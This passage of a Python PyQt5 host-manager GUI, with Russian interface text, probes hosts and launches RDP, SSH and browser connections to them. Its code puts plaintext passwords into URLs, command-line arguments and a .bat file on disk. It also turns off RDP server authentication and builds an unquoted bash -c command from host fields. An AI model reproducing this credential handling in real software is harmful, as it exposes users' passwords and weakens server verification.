            self._probe_threads.remove(sender)

    @QtCore.pyqtSlot(int, Host)
    def on_probe_result(self, index: int, updated: Host):
        if 0 <= index < len(self.hosts):
            old_status = self.hosts[index].reachable
            new_status = updated.reachable
            self.hosts[index] = updated
            self.storage.save(self.hosts)
            item = self.list_widget.item(index)
            if isinstance(item, HostListItem):
                item.host = updated
                item.refresh_text()
            if self.list_widget.currentRow() == index:
                self.show_details(updated)
            
            if old_status != new_status:
                status_text = "доступен" if new_status else "недоступен"
                self.append_to_console(f"Узел {updated.ip} теперь {status_text}")

    def on_item_clicked(self, item: QtWidgets.QListWidgetItem):
        if isinstance(item, HostListItem):
            self.show_details(item.host)

    def on_item_double_clicked(self, item: QtWidgets.QListWidgetItem):
        if isinstance(item, HostListItem):
            self.launch(item.host)

    def show_details(self, host: Host):
        details = [
            f"IP: {host.ip}",
            f"Логин: {host.username}",
            f"Статус: {'доступен' if host.reachable else 'недоступен'}",
            f"Протокол: {host.protocol or '—'}",
            f"ОС: {host.os_hint or '—'}",
            f"ОС (детект): {host.os_detected or '—'}",
            f"Открытые порты: {', '.join(map(str, host.open_ports)) if host.open_ports else '—'}",
            f"Сканирование: {'завершено' if host.scan_completed else 'не проводилось'}",
            f"Заметка: {host.note}",
        ]
        self.details.setText('\n'.join(details))

    def launch(self, host: Host):
        proto = host.protocol
        if not proto:
            proto = 'rdp'
        
        self.append_to_console(f"Подключаюсь к {host.ip} по протоколу {proto}")
        
        if proto == 'ssh':
            self._launch_ssh(host)
        elif proto == 'rdp':
            self._launch_rdp(host)
        elif proto in ('http', 'https'):
            self._launch_http(host, https=(proto == 'https'))
        else:
            self._launch_http(host, https=False)

    def _launch_http(self, host: Host, https: bool):
        scheme = 'https' if https else 'http'
        if host.username and host.password:
            url = f"{scheme}://{host.username}:{host.password}@{host.ip}"
        else:
            url = f"{scheme}://{host.ip}"
        self.append_to_console(f"Открываю веб-интерфейс: {url}")
        webbrowser.open(url)

    def _launch_rdp(self, host: Host):
        """Улучшенный запуск RDP подключения"""
        try:
            self.append_to_console(f"Подготовка RDP подключения к {host.ip}")
            
            # Создаем RDP файл с улучшенными настройками
            rdp_content = f"""screen mode id:i:2
use multimon:i:1
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,0,0,800,600
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:{host.ip}
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:0
prompt for credentials:i:0
negotiate security layer:i:0
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
drivestoredirect:s:
username:s:{host.username}
"""
            
            rdp_file = os.path.join(DATA_DIR, f"{host.ip}.rdp")
            with open(rdp_file, 'w', encoding='utf-8') as f:
                f.write(rdp_content)
            
            # Запускаем RDP
            self.append_to_console(f"Запускаю RDP подключение к {host.ip}")
            subprocess.Popen(['mstsc.exe', rdp_file], 
                           creationflags=subprocess.CREATE_NEW_CONSOLE)
            
        except Exception as e:
            self.append_to_console(f"Ошибка запуска RDP: {e}")
            # Fallback - простой запуск
            try:
                subprocess.Popen(['mstsc.exe', f'/v:{host.ip}'],
                               creationflags=subprocess.CREATE_NEW_CONSOLE)
            except Exception as e2:
                self.append_to_console(f"Fallback RDP также failed: {e2}")
                QtWidgets.QMessageBox.warning(self, 'Ошибка RDP', 
                                            f'Не удалось запустить RDP подключение:\n{e}')

    def _launch_ssh(self, host: Host):
        """Улучшенный запуск SSH подключения"""
        try:
            # Проверяем доступные SSH клиенты в порядке предпочтения
            clients = [
                ('putty', ['-ssh', f'{host.username}@{host.ip}', '-pw', host.password]),
                ('plink', ['-ssh', f'{host.username}@{host.ip}', '-pw', host.password]),
            ]
            
            for client_name, args in clients:
                client_path = shutil.which(client_name)
                if client_path:
                    self.append_to_console(f"Запускаю {client_name} для подключения к {host.ip}")
                    subprocess.Popen([client_path] + args, 
                                   creationflags=subprocess.CREATE_NEW_CONSOLE)
                    return
            
            # Если не нашли Putty/Plink, используем системный SSH с улучшенной логикой
            self.append_to_console(f"Запускаю SSH подключение к {host.ip}")
            
            # Создаем BAT файл для SSH подключения (чтобы окно не закрывалось)
            if os.name == 'nt':
                bat_content = f"""@echo off
echo Подключение SSH к {host.ip}
echo Логин: {host.username}
echo Пароль: {host.password}
echo.
ssh {host.username}@{host.ip}
pause
"""
                bat_file = os.path.join(DATA_DIR, f"ssh_{host.ip}.bat")
                with open(bat_file, 'w', encoding='utf-8') as f:
                    f.write(bat_content)
                
                subprocess.Popen(['cmd.exe', '/c', bat_file], 
                               creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                # Для Linux
                cmd = f'ssh {host.username}@{host.ip}'
                subprocess.Popen(['x-terminal-emulator', '-e', 'bash', '-c', f'echo "Подключение к {host.ip}"; {cmd}; bash'])
                
        except Exception as e:
            self.append_to_console(f"Ошибка запуска SSH: {e}")
            QtWidgets.QMessageBox.warning(self, 'Ошибка SSH', f'Не удалось запустить SSH: {e}')

    def closeEvent(self, event: QtGui.QCloseEvent) -> None:
        for t in list(self._probe_threads):
            try:
                t.quit()
                t.wait(2000)
            except Exception:
                pass
        self._probe_threads.clear()
        return super().closeEvent(event)


def main():
    app = QtWidgets.QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()